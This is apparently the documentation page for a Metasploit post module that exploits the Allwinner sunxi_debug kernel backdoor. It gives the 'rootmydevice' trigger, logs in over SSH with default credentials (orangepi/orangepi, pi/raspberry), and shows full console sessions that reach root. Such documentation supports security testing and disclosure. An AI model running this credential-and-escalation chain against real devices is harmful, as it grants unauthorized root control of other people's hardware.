  Vulnerable Allwinner SoC chips: H3, A83T or H8 which rely on Kernel 3.4
  Vulnerable OS: all OS images available for Orange Pis,
				 any for FriendlyARM's NanoPi M1,
				 SinoVoip's M2+ and M3,
				 Cuebietech's Cubietruck +
				 Linksprite's pcDuino8 Uno
  Exploitation may be possible against Dragon (x10) and Allwinner Android tablets

This module attempts to exploit a debug backdoor privilege escalation in Allwinner SoC based devices. Implements the Allwinner privilege escalation as documented in [Metasploit issue #6869](https://github.com/rapid7/metasploit-framework/issues/6869).  It is a simple debug kernel module that, when "rootmydevice" is echoed to the process, it escalates the shell to root.

## Usage

To use this module, you need a vulnerable device.  An Orange Pi (PC model) running Lubuntu 14.04 v0.8.0 works, but other OSes for the device (as well as other devices) are also vulnerable.

- `use auxiliary/scanner/ssh/ssh_login`

```
msf auxiliary(ssh_login) > set username orangepi
username => orangepi
msf auxiliary(ssh_login) > set password orangepi
password => orangepi
msf auxiliary(ssh_login) > set rhosts 192.168.2.21
rhosts => 192.168.2.21
msf auxiliary(ssh_login) > exploit

[*] 192.168.2.21:22 SSH - Starting bruteforce
[+] 192.168.2.21:22 SSH - Success: 'orangepi:orangepi' 'uid=1001(orangepi) gid=1001(orangepi) groups=1001(orangepi),27(sudo),29(audio) Linux orangepi 3.4.39 #41 SMP PREEMPT Sun Jun 21 13:09:26 HKT 2015 armv7l armv7l armv7l GNU/Linux '
[!] No active DB -- Credential data will not be saved!
[*] Command shell session 1 opened (192.168.2.229:33673 -> 192.168.2.21:22) at 2016-05-17 21:55:27 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- `use post/multi/escalate/allwinner_backdoor`

```
msf post(allwinner_backdoor) > set verbose true
verbose => true
msf post(allwinner_backdoor) > set session 1
session => 1
msf post(allwinner_backdoor) > run
```

## Successful exploitation:

```
[+] Backdoor found, exploiting.
[+] Privilege Escalation Successful
[*] Post module execution completed
msf post(allwinner_backdoor) > sessions -i 1
[*] Starting interaction with 1...

2013564244
uHvwyYtCTXENEYdrCoKdgVxTpKlbnqsW
true
RUVRnPJFFgVpuqEiYXdtXpwdDZxVwZPS
TitlDmvnSvINczARsMAKdajpRoXEohXO
0
RtBPRSiAsiGoFatKQVukpjIjGBpJdXqq
id
uid=0(root) gid=0(root) groups=0(root),27(sudo),29(audio),1001(orangepi)
^Z
Background session 1? [y/N]  y
```

## Graceful exit on non-vulnerable devices:

```
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > set username pi
username => pi
msf auxiliary(ssh_login) > set password raspberry
password => raspberry
msf auxiliary(ssh_login) > set rhosts basementpi
rhosts => basementpi
msf auxiliary(ssh_login) > exploit

[*] 192.168.2.80:22 SSH - Starting bruteforce
[+] 192.168.2.80:22 SSH - Success: 'pi:raspberry' 'uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),106(netdev),996(gpio),997(i2c),998(spi),999(input) Linux basementpi 4.1.19-v7+ #858 SMP Tue Mar 15 15:56:00 GMT 2016 armv7l GNU/Linux '
[!] No active DB -- Credential data will not be saved!
[*] Command shell session 1 opened (192.168.2.229:36438 -> 192.168.2.80:22) at 2016-05-17 22:19:57 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) > use post/multi/escalate/allwinner_backdoor
msf post(allwinner_backdoor) > set verbose true
verbose => true
msf post(allwinner_backdoor) > set session 1
session => 1
msf post(allwinner_backdoor) > run

[-] Backdoor /proc/sunxi_debug/sunxi_debug not found.
[*] Post module execution completed
```
